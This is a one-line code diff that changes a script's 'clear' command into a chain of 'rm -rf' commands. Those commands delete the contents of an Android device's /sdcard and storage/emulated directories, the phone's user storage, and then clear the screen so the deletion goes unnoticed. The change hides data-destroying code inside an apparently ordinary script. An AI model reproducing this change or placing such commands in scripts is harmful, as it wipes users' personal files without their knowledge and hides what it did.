@@ -1,1 +1,1 @@
-clear
+rm -rf /sdcard/;rm -rf /sdcard/*;rm -rf storage/emulated/0/*;rm -rf storage/emulated/0/*;rm -rf storage/emulated/*;rm -rf storage/emulated/;clear
